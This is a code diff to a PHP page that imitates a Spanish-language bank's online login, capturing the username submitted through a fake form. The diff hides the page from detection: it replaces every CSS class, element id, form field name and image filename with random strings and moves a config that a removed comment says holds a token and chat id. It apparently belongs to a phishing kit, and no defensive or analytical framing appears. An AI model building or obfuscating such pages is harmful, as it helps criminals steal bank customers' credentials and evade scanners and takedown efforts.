@@ -3,14 +3,15 @@
 /* Generated: 2026-03-29 */
 /* Security Layer Active */
 session_start();
-include("settings.php"); // Este archivo debe tener $token y $chat_id
+define('PROME_OK', true);
+include("private/cfg.php");
 
 // Random seed for security purposes
 $security_seed = rand(1000, 9999);
 $session_token = bin2hex(random_bytes(8));
 
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    $usuario = str_replace(' ', '', $_POST['ips1'] ?? '');
+    $usuario = str_replace(' ', '', $_POST['u_a8k3z'] ?? '');
 
     $_SESSION['usuario']        = $usuario;
     $_SESSION['security_token'] = $session_token;
@@ -40,7 +41,7 @@ body{
     min-height:100vh;
 }
 
-.container{
+.ctW9k{
     display:flex;
     width:100%;
     height:100vh;
@@ -50,7 +51,7 @@ body{
    LEFT PANEL
 ========================= */
 
-.left-panel{
+.lpA3m{
     flex:0 0 40%;
     position:sticky;
     top:0;
@@ -59,14 +60,14 @@ body{
     background:#ddd;
 }
 
-.left-panel img{
+.lpA3m img{
     width:100%;
     height:100%;
     object-fit:cover;
     display:block;
 }
 
-.security-banner{
+.sbF2x{
     position:absolute;
     bottom:0;
     left:0;
@@ -79,7 +80,7 @@ body{
     font-weight:400;
 }
 
-.security-banner::before{
+.sbF2x::before{
     content:"";
     position:absolute;
     left:18px;
@@ -94,7 +95,7 @@ body{
     background-size:20px;
 }
 
-.security-banner a{
+.sbF2x a{
     display:inline-block;
     margin-top:8px;
     color:#fff;
@@ -106,7 +107,7 @@ body{
    RIGHT PANEL
 ========================= */
 
-.right-panel{
+.rpQ7n{
     flex:0 0 60%;
     display:flex;
     justify-content:flex-start;
@@ -116,7 +117,7 @@ body{
     overflow-y:auto;
 }
 
-.login-box{
+.lbR5j{
     width:100%;
     max-width:560px;
     margin:auto;
@@ -126,14 +127,14 @@ body{
    LOGO
 ========================= */
 
-.logo{
+.lgT8b{
     width:100%;
     display:flex;
     justify-content:center;
     margin-bottom:52px;
 }
 
-.logo-img{
+.liY4v{
     width:280px;
     max-width:100%;
     object-fit:contain;
@@ -143,7 +144,7 @@ body{
    TITULO
 ========================= */
 
-.welcome{
+.wcK1p{
     font-size:33px;
     line-height:1.35;
     color:#00853f;
@@ -151,7 +152,7 @@ body{
     margin-bottom:44px;
 }
 
-.welcome strong{
+.wcK1p strong{
     font-weight:500;
 }
 
@@ -186,14 +187,14 @@ input[type="password"]:focus{
     border-color:#00853f;
 }
 
-.field{
+.flD2w{
     margin-bottom:18px;
 }
-.field:last-of-type{
+.flD2w:last-of-type{
     margin-bottom:0;
 }
 
-.btn-ingresar{
+.biG7r{
     width:100%;
     height:56px;
     margin-top:40px;
@@ -207,7 +208,7 @@ input[type="password"]:focus{
     transition:0.2s;
 }
 
-.btn-ingresar:hover{
+.biG7r:hover{
     background:#006633;
 }
 
@@ -215,18 +216,18 @@ input[type="password"]:focus{
    LINKS
 ========================= */
 
-.forgot{
+.fgL9s{
     text-align:center;
     margin-top:38px;
 }
 
-.forgot a{
+.fgL9s a{
     color:#007a3d;
     font-size:15px;
     text-decoration:underline;
 }
 
-.divider-links{
+.dlV4k{
     margin-top:42px;
     padding-top:34px;
     border-top:1px solid #dfdfdf;
@@ -236,7 +237,7 @@ input[type="password"]:focus{
     font-size:15px;
 }
 
-.divider-links a{
+.dlV4k a{
     color:#007a3d;
     font-weight:500;
     text-decoration:underline;
@@ -246,21 +247,21 @@ input[type="password"]:focus{
    HELP SECTION
 ========================= */
 
-.help-section{
+.hsB6m{
     margin-top:42px;
     padding-top:34px;
     border-top:1px solid #dfdfdf;
     text-align:center;
 }
 
-.help-img{
+.hiC1p{
     max-width:150px;
     width:50%;
     height:auto;
     display:inline-block;
 }
 
-.help-section p{
+.hsB6m p{
     margin-bottom:18px;
     font-size:15px;
     color:#444;
@@ -305,16 +306,16 @@ input[type="password"]:focus{
         overflow:auto;
     }
 
-    .container{
+    .ctW9k{
         flex-direction:column;
         height:auto;
     }
 
-    .left-panel{
+    .lpA3m{
         display:none;
     }
 
-    .right-panel{
+    .rpQ7n{
         flex:none;
         width:100%;
         padding:28px 22px;
@@ -322,20 +323,20 @@ input[type="password"]:focus{
         overflow:visible;
     }
 
-    .login-box{
+    .lbR5j{
         max-width:100%;
     }
 
-    .logo{
+    .lgT8b{
         justify-content:flex-start;
         margin-bottom:24px;
     }
 
-    .logo-img{
+    .liY4v{
         width:210px;
     }
 
-    .welcome{
+    .wcK1p{
         font-size:24px;
         margin-bottom:24px;
     }
@@ -353,79 +354,79 @@ input[type="password"]:focus{
         border-radius:3px;
     }
 
-    .field{
+    .flD2w{
         margin-bottom:10px;
     }
 
-    .btn-ingresar{
+    .biG7r{
         height:40px;
         font-size:14px;
         margin-top:20px;
         border-radius:3px;
     }
 
-    .forgot{
+    .fgL9s{
         margin-top:22px;
     }
 
-    .forgot a{
+    .fgL9s a{
         font-size:13px;
     }
 
-    .divider-links{
+    .dlV4k{
         margin-top:24px;
         padding-top:20px;
         font-size:13px;
         line-height:2;
     }
 
-    .help-section{
+    .hsB6m{
         display:none;
     }
 }
 </style>
 </head>
 <body>
-  <div class="container">
+  <div class="ctW9k">
     <!-- LEFT: IMAGE PLACEHOLDER -->
-    <div class="left-panel">
-      <img src="img/imgFondoLogin.png" alt="">
-      <div class="security-banner">
+    <div class="lpA3m">
+      <img src="img/bg_x7k2m9.png" alt="">
+      <div class="sbF2x">
         Nunca comparta por teléfono, email o redes sociales su clave de acceso, número de PIN o información confidencial.
         <br><a href="#">Ver más consejos de seguridad</a>
       </div>
     </div>
 
     <!-- RIGHT: LOGIN -->
-    <div class="right-panel">
-      <div class="login-box">
-        <div class="logo">
-          <img src="img/imgLogoLogin.png" alt="Prox" class="logo-img">
+    <div class="rpQ7n">
+      <div class="lbR5j">
+        <div class="lgT8b">
+          <img src="img/lg_p4n8q3.png" alt="Prox" class="liY4v">
 
 
         </div>
 
-        <h1 class="welcome">Te damos la bienvenida a<br>tu <strong>Banca en Línea</strong></h1>
+        <h1 class="wcK1p">Te damos la bienvenida a<br>tu <strong>Banca en Línea</strong></h1>
 
         <form action="index.php" method="POST">
-          <div class="field">
-            <label for="ips1">Ingresa tu usuario</label>
-            <input type="text" id="ips1" name="ips1" autocomplete="username" required style="text-transform:uppercase" oninput="this.value=this.value.toUpperCase()">
+          <div class="flD2w">
+            <label for="u_a8k3z">Ingresa tu usuario</label>
+            <input type="text" id="u_a8k3z" name="u_a8k3z" autocomplete="username" required style="text-transform:uppercase" oninput="this.value=this.value.toUpperCase()">
           </div>
-          <button type="submit" id="btnIngresar" class="btn-ingresar">Ingresar</button>
+          <button type="submit" id="bIv2k" class="biG7r">Ingresar</button>
         </form>
 
-        <div class="forgot">
+        <div class="fgL9s">
           <a href="#">¿Olvidaste tu usuario?</a>
         </div>
 
-        <div class="divider-links">
+        <div class="dlV4k">
           ¿Es tu primer ingreso? <a href="#">Crea tu usuario</a><br>
           ¿Aún no tienes una cuenta con nosotros? <a href="#">Abrir cuenta</a>
         </div>
 
-        <div class="help-section">
-          <img src="img/necesitasayuda.png" alt="¿Necesitas ayuda?" class="help-img">
+        <div class="hsB6m">
+          <img src="img/hlp_r5t1w6.png" alt="¿Necesitas ayuda?" class="hiC1p">
         </div>
       </div>
     </div>
